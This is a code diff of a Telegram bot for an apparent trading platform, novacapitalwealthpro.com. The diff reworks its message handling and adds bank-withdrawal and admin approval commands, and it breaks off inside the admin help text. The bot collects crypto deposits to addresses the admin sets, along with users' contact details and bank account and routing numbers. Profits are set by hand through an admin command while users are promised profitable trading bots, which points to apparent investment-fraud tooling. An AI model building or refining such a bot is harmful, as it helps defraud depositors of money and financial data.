@@ -86,15 +86,17 @@ async def start_registration(update: Update, context: ContextTypes.DEFAULT_TYPE)
     """Start user registration process"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "Please enter your full name:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Please enter your full name:",
         reply_markup=create_cancel_keyboard()
     )
     return WAITING_NAME
@@ -145,90 +147,47 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 📱 **Phone:** {user_info['phone']}
 🆔 **User ID:** {user_id}
 
-Please create an account for this user on novacapitalwealthpro.com and send them the login details."""
-    
-    # Create approve button for admin
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve User", callback_data=f'approve_user_{user_id}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+Please create an account for this user on novacapitalwealthpro.com and send them the login details.
+Use /approveuser {user_id} to approve this account."""
     
     try:
         await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
-            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
         logger.error(f"Failed to send admin notification: {e}")
     
+    keyboard = [
+        [InlineKeyboardButton("✅ Proceed", callback_data='proceed_to_menu')],
+        [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
     await update.message.reply_text(
-        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved."
+        f"Welcome, {user_info['name']}! Your registration is awaiting admin confirmation. You'll be notified once approved.",
+        reply_markup=reply_markup
     )
     
-    return ConversationHandler.END
-
-async def handle_user_approval(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle admin's user approval via button"""
-    query = update.callback_query
-    await query.answer()
-    
-    if update.effective_user.id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
-        return
-    
-    try:
-        user_id = int(query.data.split('_')[-1])
-        
-        if user_id not in user_data:
-            await query.edit_message_text("❌ User not found.")
-            return
-        
-        user_info = get_user_data(user_id)
-        user_info['approved'] = True
-        
-        # Add proceed button to user notification
-        keyboard = [
-            [InlineKeyboardButton("✅ Proceed to Menu", callback_data='proceed_to_menu')]
-        ]
-        reply_markup = InlineKeyboardMarkup(keyboard)
-        
-        try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=f"🎉 Great news {user_info['name']}! Your account has been approved. You can now visit our website and use all trading features.",
-                reply_markup=reply_markup
-            )
-        except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
-        
-        await query.edit_message_text(
-            f"{query.message.text}\n\n✅ **User Approved** - {user_info['name']} (ID: {user_id})"
-        )
-        
-    except (ValueError, IndexError):
-        await query.edit_message_text("❌ Invalid format.")
+    return MAIN_MENU
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Display the main menu"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        if update.callback_query:
-            await update.callback_query.answer()
-            await update.callback_query.edit_message_text("Admins cannot access user features. Use admin commands like /adminpanel or /listusers.")
-        else:
-            await update.message.reply_text("Admins cannot access user features. Use admin commands like /adminpanel or /listusers.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features. Use admin commands like /adminpanel or /listusers."
+        )
         return ConversationHandler.END
-    
     user_info = get_user_data(user_id)
     
     if not user_info['approved']:
-        if update.callback_query:
-            await update.callback_query.answer()
-            await update.callback_query.edit_message_text("Your account is not approved yet. Please wait for admin confirmation.")
-        else:
-            await update.message.reply_text("Your account is not approved yet. Please wait for admin confirmation.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Your account is not approved yet. Please wait for admin confirmation."
+        )
         return ConversationHandler.END
     
     if update.callback_query:
@@ -254,7 +213,8 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     if update.callback_query:
-        await update.callback_query.edit_message_text(
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
             text=menu_text,
             reply_markup=reply_markup,
             parse_mode='Markdown'
@@ -268,22 +228,23 @@ async def handle_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     """Handle deposit request"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
     keyboard = [
         [InlineKeyboardButton("₿ Crypto", callback_data='deposit_crypto')],
-        [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "How would you like to deposit?",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="How would you like to deposit?",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -292,9 +253,10 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
     """Show cryptocurrency options"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -302,13 +264,13 @@ async def show_crypto_options(update: Update, context: ContextTypes.DEFAULT_TYPE
     keyboard = []
     for crypto in crypto_addresses.keys():
         keyboard.append([InlineKeyboardButton(f"{crypto}", callback_data=f'crypto_select_{crypto}')])
-    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')])
     keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "Select your preferred cryptocurrency:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Select your preferred cryptocurrency:",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -317,9 +279,10 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
     """Handle cryptocurrency selection"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -327,8 +290,9 @@ async def handle_crypto_selection(update: Update, context: ContextTypes.DEFAULT_
     crypto_name = query.data.split('_')[-1]
     context.user_data['selected_crypto'] = crypto_name
     
-    await query.edit_message_text(
-        f"Enter the amount you want to deposit in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text=f"Enter the amount you want to deposit in USD:",
         reply_markup=create_cancel_keyboard()
     )
     return DEPOSIT_AMOUNT
@@ -351,7 +315,6 @@ async def get_deposit_amount(update: Update, context: ContextTypes.DEFAULT_TYPE)
         keyboard = [
             [InlineKeyboardButton("📋 Copy Address", callback_data=f'copy_address_{crypto_name}')],
             [InlineKeyboardButton("✅ I Have Made Payment", callback_data='payment_made')],
-            [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')],
             [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
@@ -378,9 +341,10 @@ async def copy_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     """Send crypto address as copyable text"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -399,15 +363,17 @@ async def payment_made(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     """Handle payment confirmation"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "Please send a screenshot of your payment as proof:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Please send a screenshot of your payment as proof:",
         reply_markup=create_cancel_keyboard()
     )
     return DEPOSIT_PROOF
@@ -422,6 +388,8 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     amount = context.user_data.get('deposit_amount', 0)
     crypto_name = context.user_data.get('selected_crypto', 'Unknown')
     
+    context.user_data['deposit_message_id'] = update.message.message_id if update.message else None
+    
     admin_message = f"""💳 **New Deposit Request**
 
 👤 **User:** {user_info['name']} (ID: {user_id})
@@ -430,7 +398,7 @@ async def get_deposit_proof(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
 
-Click 'Approve' to confirm this deposit."""
+Click 'Approve' to confirm this deposit or use /approve {user_id} {amount:.2f}."""
     
     keyboard = [
         [InlineKeyboardButton("✅ Approve", callback_data=f'confirm_deposit_{user_id}_{amount}')]
@@ -438,12 +406,13 @@ Click 'Approve' to confirm this deposit."""
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        await context.bot.send_message(
+        message = await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
+        context.user_data['admin_deposit_message_id'] = message.message_id
         
         if update.message.photo:
             await context.bot.forward_message(
@@ -468,23 +437,29 @@ Click 'Approve' to confirm this deposit."""
     )
     return MAIN_MENU
 
-async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle admin's deposit confirmation via button"""
     query = update.callback_query
     await query.answer()
     
     if update.effective_user.id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
-        return
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
+        return MAIN_MENU
     
     try:
-        _, _, user_id_str, amount_str = query.data.split('_')
+        _, user_id_str, amount_str = query.data.split('_')
         user_id = int(user_id_str)
         amount = float(amount_str)
         
         if user_id not in user_data:
-            await query.edit_message_text("❌ User not found.")
-            return
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="❌ User not found."
+            )
+            return MAIN_MENU
         
         user_info = get_user_data(user_id)
         user_info['balance'] += amount
@@ -503,16 +478,23 @@ async def handle_deposit_confirmation(update: Update, context: ContextTypes.DEFA
             f"{query.message.text}\n\n✅ **Deposit Approved** for user {user_id}."
         )
         
-    except (ValueError, IndexError):
-        await query.edit_message_text("❌ Invalid format.")
+        return MAIN_MENU
+        
+    except ValueError:
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Invalid format."
+        )
+        return MAIN_MENU
 
 async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Handle withdrawal request"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -520,13 +502,13 @@ async def handle_withdrawal(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     keyboard = [
         [InlineKeyboardButton("₿ Crypto", callback_data='withdraw_crypto')],
         [InlineKeyboardButton("🏦 Bank Transfer", callback_data='withdraw_bank')],
-        [InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')],
         [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "How would you like to withdraw?",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="How would you like to withdraw?",
         reply_markup=reply_markup
     )
     return MAIN_MENU
@@ -535,17 +517,19 @@ async def withdraw_crypto_amount(update: Update, context: ContextTypes.DEFAULT_T
     """Get withdrawal amount for crypto"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
     context.user_data['withdrawal_method'] = 'crypto'
     
-    await query.edit_message_text(
-        "Enter the amount you want to withdraw in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Enter the amount you want to withdraw in USD:",
         reply_markup=create_cancel_keyboard()
     )
     return WITHDRAW_AMOUNT
@@ -554,17 +538,19 @@ async def withdraw_bank_amount(update: Update, context: ContextTypes.DEFAULT_TYP
     """Get withdrawal amount for bank transfer"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
     context.user_data['withdrawal_method'] = 'bank'
     
-    await query.edit_message_text(
-        "Enter the amount you want to withdraw in USD:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="Enter the amount you want to withdraw in USD:",
         reply_markup=create_cancel_keyboard()
     )
     return WITHDRAW_AMOUNT
@@ -631,18 +617,12 @@ async def get_crypto_address(update: Update, context: ContextTypes.DEFAULT_TYPE)
 📱 **Phone:** {user_info['phone']}
 📧 **Email:** {user_info['email']}
 
-Click approve to process this withdrawal."""
-    
-    keyboard = [
-        [InlineKeyboardButton("✅ Approve", callback_data=f'approve_withdrawal_{user_id}_{amount}')]
-    ]
-    reply_markup = InlineKeyboardMarkup(keyboard)
+Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
     
     try:
         await context.bot.send_message(
             chat_id=ADMIN_USER_ID,
             text=admin_message,
-            reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
@@ -661,56 +641,90 @@ Click approve to process this withdrawal."""
     )
     return MAIN_MENU
 
-async def handle_withdrawal_approval(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Handle admin's withdrawal approval via button"""
-    query = update.callback_query
-    await query.answer()
+async def get_bank_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get bank name"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['bank_name'] = update.message.text.strip()
     
-    if update.effective_user.id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
-        return
+    await update.message.reply_text(
+        "Please enter your account number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ACCOUNT
+
+async def get_account_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get account number"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['account_number'] = update.message.text.strip()
+    
+    await update.message.reply_text(
+        "Please enter your routing number:",
+        reply_markup=create_cancel_keyboard()
+    )
+    return WITHDRAW_ROUTING
+
+async def get_routing_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Get routing number and process bank withdrawal"""
+    user_id = update.effective_user.id
+    if user_id == ADMIN_USER_ID:
+        await update.message.reply_text("Admins cannot access user features.")
+        return ConversationHandler.END
+    context.user_data['routing_number'] = update.message.text.strip()
+    
+    user_info = get_user_data(user_id)
+    amount = context.user_data['withdraw_amount']
+    bank_name = context.user_data['bank_name']
+    account_number = context.user_data['account_number']
+    routing_number = context.user_data['routing_number']
+    
+    admin_message = f"""💸 **Bank Withdrawal Request**
+
+👤 **User:** {user_info['name']} (ID: {user_id})
+💰 **Amount:** ${amount:.2f}
+🏦 **Bank:** {bank_name}
+🔢 **Account:** {account_number}
+🔢 **Routing:** {routing_number}
+📱 **Phone:** {user_info['phone']}
+📧 **Email:** {user_info['email']}
+
+Use /approvewithdrawal {user_id} {amount} to approve this withdrawal."""
     
     try:
-        _, _, user_id_str, amount_str = query.data.split('_')
-        user_id = int(user_id_str)
-        amount = float(amount_str)
-        
-        if user_id not in user_data:
-            await query.edit_message_text("❌ User not found.")
-            return
-        
-        user_info = get_user_data(user_id)
-        
-        if amount > user_info['balance']:
-            await query.edit_message_text("❌ Insufficient user balance.")
-            return
-        
-        user_info['balance'] -= amount
-        user_info['withdrawal'] += amount
-        user_info['pending_withdrawal'] = 0
-        
-        try:
-            await context.bot.send_message(
-                chat_id=user_id,
-                text=f"✅ Your withdrawal of ${amount:.2f} has been processed! Your new balance is ${user_info['balance']:.2f}."
-            )
-        except TelegramError as e:
-            logger.error(f"Failed to notify user {user_id}: {e}")
-        
-        await query.edit_message_text(
-            f"{query.message.text}\n\n✅ **Withdrawal Approved** for user {user_id}."
+        await context.bot.send_message(
+            chat_id=ADMIN_USER_ID,
+            text=admin_message,
+            parse_mode='Markdown'
         )
-        
-    except (ValueError, IndexError):
-        await query.edit_message_text("❌ Invalid format.")
+    except TelegramError as e:
+        logger.error(f"Failed to send admin notification: {e}")
+        await update.message.reply_text(
+            "⚠️ Failed to process withdrawal request. Please try again or contact support.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+        )
+        return MAIN_MENU
+    
+    user_info['pending_withdrawal'] = amount
+    
+    await update.message.reply_text(
+        "Your withdrawal request is pending admin confirmation.",
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
+    )
+    return MAIN_MENU
 
 async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Show copy trading options"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -718,13 +732,13 @@ async def show_copy_trade(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     keyboard = []
     for bot_name in trading_bots.keys():
         keyboard.append([InlineKeyboardButton(f"🤖 {bot_name}", callback_data=f'select_bot_{bot_name}')])
-    keyboard.append([InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')])
     keyboard.append([InlineKeyboardButton("❌ Cancel", callback_data='cancel')])
     
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
-        "🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🤖 **Select Trading Bot**\n\nChoose a trading bot to copy their strategies:",
         reply_markup=reply_markup,
         parse_mode='Markdown'
     )
@@ -734,9 +748,10 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
     """Handle trading bot selection"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -745,8 +760,9 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
     user_info = get_user_data(user_id)
     
     if user_info['active_bot'] == bot_name:
-        await query.edit_message_text(
-            f"You are already using {bot_name}. Please wait while it generates profits.",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=f"You are already using {bot_name}. Please wait while it generates profits.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
         )
     else:
@@ -759,8 +775,9 @@ async def select_trading_bot(update: Update, context: ContextTypes.DEFAULT_TYPE)
 
 Our refined strategy will keep you in profits. Monitor your progress in the main menu."""
         
-        await query.edit_message_text(
-            message,
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text=message,
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]),
             parse_mode='Markdown'
         )
@@ -771,15 +788,17 @@ async def handle_stake(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     """Handle staking (placeholder)"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text(
-        "🎯 Staking is coming soon! Stay tuned for this exciting feature.",
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="🎯 Staking is coming soon! Stay tuned for this exciting feature.",
         reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
     )
     return MAIN_MENU
@@ -788,9 +807,10 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     """Handle website visit"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -798,8 +818,9 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     user_info = get_user_data(user_id)
     
     if not user_info['approved']:
-        await query.edit_message_text(
-            "Please wait for your account to be created. You'll be notified once approved.",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please wait for your account to be created. You'll be notified once approved.",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]])
         )
     else:
@@ -809,8 +830,9 @@ async def visit_website(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         ]
         reply_markup = InlineKeyboardMarkup(keyboard)
         
-        await query.edit_message_text(
-            "🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="🌐 **Visit Our Website**\n\nClick the button below to access your trading account:",
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
@@ -821,9 +843,10 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     """Refresh and show updated balance"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer("Balance refreshed! 🔄")
@@ -849,13 +872,14 @@ async def refresh_balance(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     try:
-        await query.edit_message_text(
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
             text=menu_text,
             reply_markup=reply_markup,
             parse_mode='Markdown'
         )
     except TelegramError as e:
-        logger.error(f"Failed to refresh balance message: {e}")
+        logger.error(f"Failed to send refresh balance message: {e}")
         await context.bot.send_message(
             chat_id=update.effective_chat.id,
             text="⚠️ Failed to refresh balance. Please try again or contact support.",
@@ -870,7 +894,10 @@ async def cancel_operation(update: Update, context: ContextTypes.DEFAULT_TYPE) -
     query = update.callback_query
     await query.answer()
     
-    await query.edit_message_text("❌ Operation cancelled. Use /start to begin again.")
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
+        text="❌ Operation cancelled. Use /start to begin again."
+    )
     
     return ConversationHandler.END
 
@@ -878,9 +905,10 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     """Return to main menu"""
     user_id = update.effective_user.id
     if user_id == ADMIN_USER_ID:
-        query = update.callback_query
-        await query.answer()
-        await query.edit_message_text("Admins cannot access user features.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Admins cannot access user features."
+        )
         return ConversationHandler.END
     query = update.callback_query
     await query.answer()
@@ -905,7 +933,8 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    await query.edit_message_text(
+    await context.bot.send_message(
+        chat_id=update.effective_chat.id,
         text=menu_text,
         reply_markup=reply_markup,
         parse_mode='Markdown'
@@ -934,6 +963,9 @@ Welcome to the admin control center. Manage users, transactions, and system sett
     
     keyboard = [
         [InlineKeyboardButton("👥 List Users", callback_data='admin_list_users')],
+        [InlineKeyboardButton("✅ Approve User", callback_data='admin_approve_user')],
+        [InlineKeyboardButton("💳 Approve Deposit", callback_data='admin_approve_deposit')],
+        [InlineKeyboardButton("💸 Approve Withdrawal", callback_data='admin_approve_withdrawal')],
         [InlineKeyboardButton("📈 Update Profit", callback_data='admin_update_profit')],
         [InlineKeyboardButton("🪙 Update Crypto Address", callback_data='admin_update_crypto')],
         [InlineKeyboardButton("ℹ️ Help", callback_data='admin_help')]
@@ -949,14 +981,20 @@ async def handle_admin_action(update: Update, context: ContextTypes.DEFAULT_TYPE
     
     user_id = update.effective_user.id
     if user_id != ADMIN_USER_ID:
-        await query.edit_message_text("❌ Unauthorized access.")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="❌ Unauthorized access."
+        )
         return
     
     action = query.data
     
     if action == 'admin_list_users':
         if not user_data:
-            await query.edit_message_text("📝 No users registered yet.")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
             return
         
         users_list = """👥 **Registered Users** 👥
@@ -982,8 +1020,6 @@ Below is a detailed list of all registered users:\n\n"""
             users_list += "━━━━━━━━━━━━━━━━━━━━\n"
         
         if len(users_list) > 4000:
-            # Split into multiple messages if too long
-            await query.edit_message_text("👥 **Registered Users** 👥\n\nList is too long, check individual messages below:")
             parts = [users_list[i:i+4000] for i in range(0, len(users_list), 4000)]
             for part in parts:
                 await context.bot.send_message(
@@ -992,45 +1028,211 @@ Below is a detailed list of all registered users:\n\n"""
                     parse_mode='Markdown'
                 )
         else:
-            await query.edit_message_text(users_list, parse_mode='Markdown')
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text=users_list,
+                parse_mode='Markdown'
+            )
+    
+    elif action == 'admin_approve_user':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter the user ID to approve (use /getid to find IDs):",
+            reply_markup=create_cancel_keyboard()
+        )
+        context.user_data['admin_action'] = 'approve_user'
+    
+    elif action == 'admin_approve_deposit':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /approve <user_id> <amount>",
+            reply_markup=create_cancel_keyboard()
+        )
+        context.user_data['admin_action'] = 'approve_deposit'
+    
+    elif action == 'admin_approve_withdrawal':
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /approvewithdrawal <user_id> <amount>",
+            reply_markup=create_cancel_keyboard()
+        )
+        context.user_data['admin_action'] = 'approve_withdrawal'
     
     elif action == 'admin_update_profit':
         if not user_data:
-            await query.edit_message_text("📝 No users registered yet.")
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
             return
-        await query.edit_message_text("Please use: /updateprofit <user_id> <amount>")
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /updateprofit <user_id> <amount>",
+            reply_markup=create_cancel_keyboard()
+        )
+        context.user_data['admin_action'] = 'update_profit'
     
     elif action == 'admin_update_crypto':
-        await query.edit_message_text("Please use: /updatecrypto <crypto_name> <address>")
+        if not user_data:
+            await context.bot.send_message(
+                chat_id=update.effective_chat.id,
+                text="📝 No users registered yet."
+            )
+            return
+        await context.bot.send_message(
+            chat_id=update.effective_chat.id,
+            text="Please enter: /updatecrypto <crypto_name> <address>",
+            reply_markup=create_cancel_keyboard()
+        )
+        context.user_data['admin_action'] = 'update_crypto'
     
     elif action == 'admin_help':
         help_text = """🛠 **Admin Panel Guide** 🛠
 
-Available commands:
